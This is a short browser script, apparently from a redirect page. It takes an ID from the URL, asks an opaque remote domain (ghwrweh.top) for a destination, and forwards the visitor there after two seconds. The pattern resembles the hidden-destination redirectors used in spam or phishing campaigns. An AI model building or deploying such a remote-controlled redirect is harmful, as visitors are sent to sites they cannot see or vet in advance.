<script>
  const urlParams = new URLSearchParams(window.location.search);
  let id = urlParams.get("id");

  // 如果 URL 参数没有 id，就尝试从路径中获取
  if (!id) {
    const pathParts = window.location.pathname.split("/").filter(Boolean);
    id = pathParts[pathParts.length - 1];
  }

  if (!id) {
    document.body.innerHTML += '<p style="color:red;">ID が見つかりません。</p>';
  } else {
    fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
      .then(res => res.json())
      .then(data => {
        if (data && data.data && data.data.siteUrl) {
          setTimeout(() => {
            location.href = data.data.siteUrl;
          }, 2000);
        } else {
          document.body.innerHTML += '<p style="color:red;">リダイレクト先が見つかりません。</p>';
        }
      })
      .catch(() => {
        document.body.innerHTML += '<p style="color:red;">API取得時にエラーが発生しました。</p>';
      });
  }
</script>
